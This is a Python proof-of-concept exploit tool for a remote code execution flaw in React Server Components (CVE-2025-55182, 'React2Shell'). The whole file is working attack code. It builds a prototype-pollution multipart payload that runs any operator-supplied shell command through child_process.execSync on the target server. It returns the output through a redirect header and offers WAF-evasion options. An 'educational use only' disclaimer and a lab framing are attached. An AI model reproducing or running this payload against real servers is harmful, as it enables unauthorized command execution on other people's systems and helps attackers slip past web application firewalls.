#!/usr/bin/env python3
"""
React2Shell (CVE-2025-55182) PoC Exploit
Lebel: Hiddeninvestigations.Net
Tool author: @sakibulalikhan

Educational use only. Use this tool ONLY against systems
you own or have explicit permission to test.
"""

import argparse
import sys
import hashlib
import time
import re
import random
import string
import json
from urllib.parse import unquote

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Theme:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    ENABLE_COLOR = True

    @classmethod
    def disable_colors(cls):
        cls.HEADER = ''
        cls.OKBLUE = ''
        cls.OKCYAN = ''
        cls.OKGREEN = ''
        cls.WARNING = ''
        cls.FAIL = ''
        cls.ENDC = ''
        cls.BOLD = ''
        cls.UNDERLINE = ''
        cls.DIM = ''
        cls.ENABLE_COLOR = False


class ExploitConfig:
    def __init__(self):
        # Base target (scheme + host / optional base path)
        self.target_url = "https://hiddeninvestigations.net"

        # Paths on the same host to probe (e.g. "/", "/_next")
        self.paths = ['/']

        # Payload behaviour
        self.payload_cmd = "id"
        self.version = "1.1"
        self.author = "@sakibulalikhan"
        self.timeout = 15  # seconds

        # WAF & payload toggles
        self.waf_bypass = False
        self.waf_bypass_size_kb = 128
        self.safe_check = False
        self.windows = False
        self.vercel_waf_bypass = False

        # HTTP configuration
        self.verify_ssl = True        # overridable with -k/--insecure
        self.custom_headers = {}

        # Output / UX
        self.verbose = False
        self.quiet = False
        self.no_color = False
        self.output_file = None
        self.output_all_results = False

    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"https://{url}"
        return url


class OutputFormatter:
    @staticmethod
    def normalize(output: str) -> str:
        """
        Normalize the raw command output we smuggled via redirect:

        - Convert " | " separators back into newlines.
        - Strip leading/trailing whitespace.

        Used both in quiet mode and the pretty banner output.
        """
        if not output:
            return ""
        cleaned = output.replace(' | ', '\n')
        return cleaned.strip()


class BannerDisplay:
    """Handles all banner and UI displays"""

    @staticmethod
    def show_header():
        """Display main exploitation framework header"""
        banner = f"""
{Theme.FAIL}{Theme.BOLD}                                                                                    
                ██████████  
            ████▒▒▒▒▒▒▒▒▒▒████                  
          ██▓▓▓▓██▒▒▒▒▒▒██▓▓▓▓██                
        ██▓▓████▓▓██████▓▓████▓▓████████        
        ████    ██▓▓▓▓▓▓██    ██▓▓▓▓▓▓▓▓██      
      ██▓▓██  ████▓▓▓▓▓▓████  ██▓▓▓▓▓▓██        
      ██▓▓██  ██████████████  ██▓▓████████      
      ██▓▓▓▓████▒▒▒▒▒▒▒▒▒▒████▓▓▓▓██▓▓▓▓▓▓██    
      ██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▓▓▓▓▓▓▓▓██  
    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓▓▓██    
    ██▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██████      
    ██▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██          
      ██▒▒▒▒▒▒██████████████▒▒▒▒▒▒██            
        ████▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒████              
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                  
              ██████████████

{Theme.ENDC}
{Theme.OKCYAN}    [CVE-2025-55182 • React2Shell • React Server Components RCE]{Theme.ENDC}
{Theme.OKBLUE}    Hiddeninvestigations.Net • React2Shell Lab PoC Client • @sakibulalikhan{Theme.ENDC}
{Theme.DIM}    Educational use only. Hit our React2Shell lab from GitHub, not random targets.{Theme.ENDC}
"""
        print(banner)

    @staticmethod
    def show_config(config: "ExploitConfig"):
        print(f"\n{Theme.OKBLUE}[*] EXPLOITATION PARAMETERS{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        print(f"{Theme.OKCYAN}  TARGET     :{Theme.ENDC} {config.target_url}")
        if config.paths:
            if len(config.paths) == 1:
                print(f"{Theme.OKCYAN}  PATH       :{Theme.ENDC} {config.paths[0]}")
            else:
                preview = ', '.join(config.paths[:3])
                if len(config.paths) > 3:
                    preview += ", ..."
                print(f"{Theme.OKCYAN}  PATHS      :{Theme.ENDC} {preview}")
        print(f"{Theme.OKCYAN}  PAYLOAD    :{Theme.ENDC} {config.payload_cmd}")
        print(f"{Theme.OKCYAN}  SAFE CHECK :{Theme.ENDC} {'enabled' if config.safe_check else 'disabled'}")
        print(f"{Theme.OKCYAN}  WINDOWS    :{Theme.ENDC} {'yes' if config.windows else 'no'}")
        print(
            f"{Theme.OKCYAN}  WAF BYPASS :{Theme.ENDC} "
            f"{'enabled' if config.waf_bypass else 'disabled'}"
            + (f" ({config.waf_bypass_size_kb}KB junk)" if config.waf_bypass else "")
        )
        print(f"{Theme.OKCYAN}  TIMEOUT    :{Theme.ENDC} {config.timeout}s")
        print(f"{Theme.OKCYAN}  VERIFY SSL :{Theme.ENDC} {'yes' if config.verify_ssl else 'no (insecure)'}")
        if config.custom_headers:
            print(f"{Theme.OKCYAN}  HEADERS    :{Theme.ENDC} {', '.join(config.custom_headers.keys())}")
        if config.output_file:
            print(f"{Theme.OKCYAN}  OUTPUT     :{Theme.ENDC} {config.output_file} "
                  f"({'all results' if config.output_all_results else 'vuln only'})")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")

    @staticmethod
    def show_success(output):
        print(f"\n{Theme.OKGREEN}{Theme.BOLD}[+] EXPLOITATION SUCCESSFUL{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")

        normalized = OutputFormatter.normalize(output)
        lines = normalized.split('\n')

        for line in lines:
            if line.strip():
                print(f"{Theme.OKGREEN}  ▸{Theme.ENDC} {line}")

        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")

    @staticmethod
    def show_failure(error_type, details=""):
        print(f"\n{Theme.FAIL}{Theme.BOLD}[X] EXPLOITATION FAILED{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")

        error_map = {
            'forbidden': ('ACCESS DENIED', 'WAF/Firewall blocking detected'),
            'timeout': ('CONNECTION TIMEOUT', 'Target did not respond'),
            'ssl': ('SSL ERROR', 'Certificate validation failed - try HTTP or --insecure'),
            'server_error': ('SERVER ERROR', 'Target rejected payload or not vulnerable'),
            'unknown': ('EXPLOITATION FAILED', 'Target may not be vulnerable')
        }

        title, msg = error_map.get(error_type, error_map['unknown'])
        print(f"{Theme.FAIL}  ▸ {title}{Theme.ENDC}")
        print(f"{Theme.WARNING}  ▸ {msg}{Theme.ENDC}")
        if details:
            print(f"{Theme.DIM}  ▸ {details}{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")

    @staticmethod
    def show_usage(parser: argparse.ArgumentParser):
        """Shown when user forgets target."""
        print(f"{Theme.WARNING}{Theme.BOLD}[!] No target specified.{Theme.ENDC}")
        print(f"{Theme.WARNING}    Use -t/--target or -u/--url to provide your React2Shell lab URL.{Theme.ENDC}\n")
        parser.print_help()
        print()  # trailing newline for nicer UX


class PayloadGenerator:
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]

    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')

    @staticmethod
    def generate_junk_data(size_kb: int = 128):
        """Generate random junk data for WAF bypass multipart prefix."""
        size_kb = max(size_kb, 1)
        size_bytes = size_kb * 1024
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(
            random.choices(
                string.ascii_letters + string.digits,
                k=size_bytes
            )
        )
        return param_name, junk

    @staticmethod
    def build_exploit_payload(command,
                              waf_bypass=False,
                              waf_bypass_size_kb=128,
                              safe_check=False,
                              windows=False,
                              vercel_waf_bypass=False):
        """
        Build the multipart body and boundary for the React2Shell payload.

        - safe_check: uses a SAFE_CHECK_OK marker instead of running your command.
        - windows: adjusts default command from 'id' -> 'whoami'.
        - vercel_waf_bypass: adds an extra benign field to tweak multipart layout.
        """
        if safe_check:
            # Non-shell payload, just sets a marker string and triggers redirect.
            prefix_code = (
                "var res='SAFE_CHECK_OK';"
                "throw Object.assign(new Error('NEXT_REDIRECT'),"
                "{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});"
            )
        else:
            effective_cmd = command
            if windows and command == "id":
                # Better default for Windows targets; works on Unix too.
                effective_cmd = "whoami"

            safe_cmd = PayloadGenerator.sanitize_command(effective_cmd)
            prefix_code = (
                "var res=process.mainModule.require('child_process')"
                f".execSync('{safe_cmd}').toString().trim().replace(/\\n/g,' | ');"
                "throw Object.assign(new Error('NEXT_REDIRECT'),"
                "{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});"
            )

        payload_obj = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": "{\"then\":\"$B1337\"}",
            "_response": {
                "_prefix": prefix_code,
                "_chunks": "$Q2",
                "_formData": {"get": "$1:constructor:constructor"}
            }
        }

        injection = json.dumps(payload_obj, separators=(',', ':'))

        # Multipart boundary with Hidden Investigations branding
        boundary = "----HiddenInvestigationsReact2Shell" + PayloadGenerator.generate_hash(12)

        body_parts = []

        # Optional WAF bypass: prepend a large junk form field before the actual exploit
        if waf_bypass:
            param_name, junk = PayloadGenerator.generate_junk_data(waf_bypass_size_kb)
            body_parts.extend([
                f"--{boundary}\r\n",
                f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n',
                f"{junk}\r\n",
            ])

        # Main exploit parts
        body_parts.extend([
            f"--{boundary}\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f"{injection}\r\n",
            f"--{boundary}\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"--{boundary}\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            "[]\r\n",
        ])

        # Simplified "Vercel WAF bypass" variant: add a benign extra field.
        if vercel_waf_bypass:
            body_parts.extend([
                f"--{boundary}\r\n",
                'Content-Disposition: form-data; name="vercel_probe"\r\n\r\n',
                "1\r\n",
            ])

        # Closing boundary
        body_parts.append(f"--{boundary}--\r\n")

        return ''.join(body_parts), boundary


class ExploitEngine:
    def __init__(self, config: ExploitConfig):
        self.config = config
        self.session = requests.Session()

    def craft_headers(self, boundary):
        headers = {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            # Branded UA, but still browser-ish
            'User-Agent': (
                'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) '
                'Gecko/20100101 Firefox/102.0 HiddenInvestigations/React2Shell-PoC'
            )
        }
        # Merge custom headers (user wins on conflicts)
        for k, v in self.config.custom_headers.items():
            headers[k] = v
        return headers

    def build_url(self, path: str) -> str:
        base = self.config.target_url.rstrip('/')
        if not path:
            return base or self.config.target_url
        if not path.startswith('/'):
            path = '/' + path
        return base + path

    def execute_for_path(self, path: str):
        url = self.build_url(path)

        if not self.config.quiet:
            print(f"{Theme.OKCYAN}[*] Initiating exploitation sequence for {url}...{Theme.ENDC}")

        payload_body, boundary = PayloadGenerator.build_exploit_payload(
            self.config.payload_cmd,
            waf_bypass=self.config.waf_bypass,
            waf_bypass_size_kb=self.config.waf_bypass_size_kb,
            safe_check=self.config.safe_check,
            windows=self.config.windows,
            vercel_waf_bypass=self.config.vercel_waf_bypass,
        )
        headers = self.craft_headers(boundary)

        if self.config.waf_bypass and not self.config.quiet:
            print(
                f"{Theme.WARNING}[*] WAF bypass enabled: prepending "
                f"{self.config.waf_bypass_size_kb}KB junk before exploit payload{Theme.ENDC}"
            )

        result = {
            "url": url,
            "path": path,
            "success": False,
            "status": "unknown",
            "output": "",
            "http": {},
        }

        try:
            response = self.session.post(
                url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=self.config.verify_ssl,
            )

            success, status, data = self.parse_response(response)
            result.update({
                "success": success,
                "status": status,
                "output": data,
                "http": {
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                },
            })

            if self.config.verbose and not self.config.quiet:
                redirect_header = response.headers.get("X-Action-Redirect", "<none>")
                print(
                    f"{Theme.DIM}[V] {url} -> HTTP {response.status_code}, "
                    f"X-Action-Redirect: {redirect_header}{Theme.ENDC}"
                )

            return result

        except requests.exceptions.Timeout:
            msg = f'Connection timeout after {self.config.timeout} seconds'
            result.update({"status": "timeout", "output": msg})
            return result
        except requests.exceptions.SSLError as e:
            result.update({"status": "ssl", "output": str(e)})
            return result
        except requests.exceptions.RequestException as e:
            result.update({"status": "unknown", "output": str(e)})
            return result

    def execute_all(self):
        results = []
        for path in self.config.paths:
            res = self.execute_for_path(path)
            results.append(res)
            # For exploitation, stop on first success unless user wants all results
            if res["success"] and not self.config.output_all_results:
                break
        return results

    def parse_response(self, response):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)

        if match:
            encoded_output = match.group(1)
            decoded_output = unquote(encoded_output)
            return True, 'success', decoded_output

        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'


def setup_arguments():
    parser = argparse.ArgumentParser(
        description=(
            "Hidden Investigations React2Shell (CVE-2025-55182) PoC exploit.\n"
            "This is a targeted educational client for our React2Shell lab."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (single host, single path):
  %(prog)s -t hiddeninvestigations.net -c "whoami"
  %(prog)s -t https://hiddeninvestigations.net --path / -c "id"
  %(prog)s -t hiddeninvestigations.net --waf-bypass --waf-bypass-size 256

Path helpers (same host, multiple endpoints):
  %(prog)s -t hiddeninvestigations.net --path / --path /_next
  %(prog)s -t hiddeninvestigations.net --path-file paths.txt

Flags inspired by Assetnote's react2shell-scanner:
  --safe-check           Use SAFE_CHECK payload (no OS shell command)
  --windows              Better defaults for Windows targets
  --waf-bypass           Add junk data for WAF evasion
  --waf-bypass-size KB   Size of junk field in KB (default: 128)

For large-scale safe detection across many hosts, use the original
Assetnote react2shell-scanner instead of this PoC.
        """
    )

    # Target selection (single host only for this PoC)
    parser.add_argument(
        '-t', '--target',
        metavar='URL',
        help='Target URL or domain (required unless --url is used)'
    )
    parser.add_argument(
        '-u', '--url',
        metavar='URL',
        help='Alias for --target (Assetnote-style flag)'
    )

    # Command to run
    parser.add_argument(
        '-c', '--command',
        metavar='CMD',
        help='Command to execute on target (default: id)'
    )

    # Networking / HTTP behaviour
    parser.add_argument(
        '--timeout',
        metavar='SECONDS',
        type=int,
        help='Request timeout in seconds (default: 15, or 20 when --waf-bypass is used)'
    )
    parser.add_argument(
        '-k', '--insecure',
        action='store_true',
        help='Disable SSL certificate verification (like curl -k)'
    )
    parser.add_argument(
        '-H', '--header',
        action='append',
        metavar='HEADER',
        help='Custom header "Name: value" (can be used multiple times)'
    )

    # Path control (same host)
    parser.add_argument(
        '--path',
        dest='paths',
        action='append',
        metavar='PATH',
        help='Custom path to test (can be used multiple times, default: /)'
    )
    parser.add_argument(
        '--path-file',
        metavar='FILE',
        help='File containing paths to test (one per line)'
    )

    # Scanner-style but intentionally limited for this PoC
    parser.add_argument(
        '-l', '--list',
        metavar='FILE',
        help='[Not implemented in this PoC] File containing hosts (one per line)'
    )
    parser.add_argument(
        '--threads',
        metavar='N',
        type=int,
        default=10,
        help='[Not implemented in this PoC] Number of concurrent threads with --list'
    )
    parser.add_argument(
        '-o', '--output',
        metavar='FILE',
        help='Write JSON results to FILE'
    )
    parser.add_argument(
        '--all-results',
        action='store_true',
        help='When using --output, include non-vulnerable results too'
    )

    # Payload behaviour toggles
    parser.add_argument(
        '--safe-check',
        action='store_true',
        help='Use a SAFE_CHECK payload instead of running your command'
    )
    parser.add_argument(
        '--windows',
        action='store_true',
        help='Adjust defaults for Windows targets (uses whoami instead of id)'
    )
    parser.add_argument(
        '--waf-bypass',
        action='store_true',
        help='Prepend junk multipart field to attempt WAF bypass'
    )
    parser.add_argument(
        '--waf-bypass-size',
        metavar='KB',
        type=int,
        default=128,
        help='Size of junk data in KB when using --waf-bypass (default: 128)'
    )
    parser.add_argument(
        '--vercel-waf-bypass',
        action='store_true',
        help='Use alternative multipart layout for Vercel WAF (simplified PoC)'
    )

    # Output / UX toggles
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose mode (show HTTP status and redirect headers)'
    )
    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Quiet mode (only print raw command output on success)'
    )
    parser.add_argument(
        '--no-color',
        action='store_true',
        help='Disable colored terminal output'
    )

    return parser


def parse_custom_headers(header_list):
    headers = {}
    if not header_list:
        return headers

    for raw in header_list:
        if ':' not in raw:
            print(f"{Theme.WARNING}[!] Skipping malformed header (expected 'Name: value'): {raw}{Theme.ENDC}")
            continue
        name, value = raw.split(':', 1)
        headers[name.strip()] = value.strip()

    return headers


def load_paths(args, config: ExploitConfig):
    paths = []

    if args.paths:
        for p in args.paths:
            p = p.strip()
            if not p:
                continue
            if not p.startswith('/'):
                p = '/' + p
            paths.append(p)

    if args.path_file:
        try:
            with open(args.path_file, 'r', encoding='utf-8') as f:
                for line in f:
                    p = line.strip()
                    if not p:
                        continue
                    if not p.startswith('/'):
                        p = '/' + p
                    paths.append(p)
        except OSError as e:
            print(f"{Theme.FAIL}[!] Failed to read path file: {e}{Theme.ENDC}")
            sys.exit(1)

    if not paths:
        paths = ['/']

    config.paths = paths


def main():
    parser = setup_arguments()

    # No args at all -> show branded help instead of silently using defaults
    if len(sys.argv) == 1:
        BannerDisplay.show_header()
        BannerDisplay.show_usage(parser)
        sys.exit(1)

    args = parser.parse_args()

    # Handle color toggle early
    if args.no_color:
        Theme.disable_colors()

    # Bulk list mode intentionally unsupported in this PoC
    if args.list:
        BannerDisplay.show_header()
        print(f"{Theme.WARNING}[!] The -l/--list bulk scanning option is intentionally not implemented in this Hidden Investigations PoC.{Theme.ENDC}")
        print(f"{Theme.WARNING}    For multi-host safe detection, use the official Assetnote react2shell-scanner instead.{Theme.ENDC}")
        sys.exit(1)

    # Determine target from -t/--target or -u/--url
    raw_target = args.target or args.url
    if not raw_target:
        BannerDisplay.show_header()
        BannerDisplay.show_usage(parser)
        sys.exit(1)

    config = ExploitConfig()
    config.target_url = config.normalize_url(raw_target)

    if args.command:
        config.payload_cmd = args.command

    # Request timeout and WAF interplay
    if args.timeout is not None:
        config.timeout = args.timeout

    config.waf_bypass = bool(args.waf_bypass)
    config.waf_bypass_size_kb = max(args.waf_bypass_size, 1)

    if config.waf_bypass and args.timeout is None:
        # When WAF bypass is enabled, give the server a bit more time.
        config.timeout = 20

    config.safe_check = bool(args.safe_check)
    config.windows = bool(args.windows)
    config.vercel_waf_bypass = bool(args.vercel_waf_bypass)

    # HTTP / TLS & headers
    config.verify_ssl = not bool(args.insecure)
    config.custom_headers = parse_custom_headers(args.header)

    # UX options
    config.verbose = bool(args.verbose)
    config.quiet = bool(args.quiet)
    config.no_color = bool(args.no_color)
    config.output_file = args.output
    config.output_all_results = bool(args.all_results)

    # Path loading
    load_paths(args, config)

    # Header + config display (unless quiet)
    if not config.quiet:
        BannerDisplay.show_header()
        BannerDisplay.show_config(config)

    engine = ExploitEngine(config)
    results = engine.execute_all()

    any_success = any(r["success"] for r in results)

    # Optional JSON output
    if config.output_file:
        to_write = []
        for r in results:
            if r["success"] or config.output_all_results:
                to_write.append({
                    "url": r["url"],
                    "path": r["path"],
                    "success": r["success"],
                    "status": r["status"],
                    "output": r["output"],
                    "http": r["http"],
                })
        try:
            with open(config.output_file, 'w', encoding='utf-8') as f:
                json.dump(to_write, f, indent=2)
            if not config.quiet:
                print(f"{Theme.OKBLUE}[*] Results written to {config.output_file}{Theme.ENDC}")
        except Exception as e:
            if not config.quiet:
                print(f"{Theme.WARNING}[!] Failed to write output file: {e}{Theme.ENDC}")

    # CLI output / exit codes
    if any_success:
        # Pick the first successful result for screen output
        first = next(r for r in results if r["success"])
        normalized = OutputFormatter.normalize(first["output"])
        if config.quiet:
            # Quiet mode: plain, pretty command output only
            print(normalized)
        else:
            BannerDisplay.show_success(first["output"])
        sys.exit(0)
    else:
        # No success, show last result (if not quiet)
        last = results[-1] if results else {
            "status": "unknown",
            "output": "No requests were sent"
        }
        if not config.quiet:
            BannerDisplay.show_failure(last["status"], last["output"])
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Exploitation interrupted by user{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)

